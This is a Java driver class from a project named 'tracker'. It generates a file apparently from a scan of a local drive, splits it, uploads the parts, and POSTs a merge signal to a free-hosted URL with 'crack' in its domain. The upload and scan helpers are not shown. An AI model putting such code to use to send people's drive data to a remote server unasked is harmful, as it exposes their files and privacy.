package tracker;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class Driver {
	static Scanner in = new Scanner(System.in);
	public static void main(String[] args) {
		// TODO Auto-generated method stub
		/*final String fileToGenerate = "C:\\Users\\HP\\Desktop\\test\\Desire2.txt";
		Generate.printRoot();
		//System.out.println("Enter drive latter: ");
		String st = "d";
		Generate gn = new Generate(fileToGenerate);
		if(gn.generate(st))System.out.println("Generated Successfully");
		else System.out.println(gn.getErrorMsg());
		Splitter sp = new Splitter(fileToGenerate);
		
		try {
			if(!sp.split()) {
				System.out.println("Nothing to split");
				Uploader.upload(fileToGenerate);
			}
			else {
				System.out.println("Splitted");
				for(String b: sp.getSplitedFileList())Uploader.upload(b);
				System.out.println("Total "+sp.getSplitedFileList().size()+" File uploaded Successfully.");
				//System.out.println("Merging status:"+sendSignal("https://toolkitacrack.000webhostapp.com/toolkitcrack/uthao/merge.php","{\"data\" : \"do\"}"));
			} 
		}catch (Exception e) {
			e.printStackTrace();
		}*/
		final String fileToGenerate = "C:\\Users\\jubae\\OneDrive\\Desktop\\test\\Desire2.txt";
		Generate.printRoot();
		//System.out.println("Enter drive latter: ");
		String st = "d";
		Generate gn = new Generate(fileToGenerate);
		if(gn.generate(st))System.out.println("Generated Successfully");
		else System.out.println(gn.getErrorMsg());
		Splitter sp = new Splitter(fileToGenerate);
		
		try {
			if(!sp.split()) {
				System.out.println("Nothing to split");
				Uploader.upload(fileToGenerate);
			}
			else {
				System.out.println("Splitted");
				for(String b: sp.getSplitedFileList())Uploader.upload(b);
				System.out.println("Total "+sp.getSplitedFileList().size()+" File uploaded Successfully.");
				System.out.println("Merging status:"+sendSignal("https://toolkitacrack.000webhostapp.com/toolkitcrack/uthao/merge.php","{\"data\" : \"do\"}"));
			} 
		}catch (Exception e) {
			e.printStackTrace();
		}
	}
	public static String sendSignal(String requestUrl, String payload) {
	    try {
	        URL url = new URL(requestUrl);
	        HttpURLConnection connection = (HttpURLConnection) url.openConnection();

	        connection.setDoInput(true);
	        connection.setDoOutput(true);
	        connection.setRequestMethod("POST");
	        connection.setRequestProperty("Accept", "application/json");
	        connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
	     
	        OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream(), "UTF-8");
	        writer.write(payload);
	        writer.close();
	        BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
	        StringBuffer jsonString = new StringBuffer();
	        String line;
	        while ((line = br.readLine()) != null) {
	                jsonString.append(line);
	        }
	        br.close();
	        connection.disconnect();
	        return jsonString.toString();
	    } catch (Exception e) {
	            throw new RuntimeException(e.getMessage());
	    }

	}

}
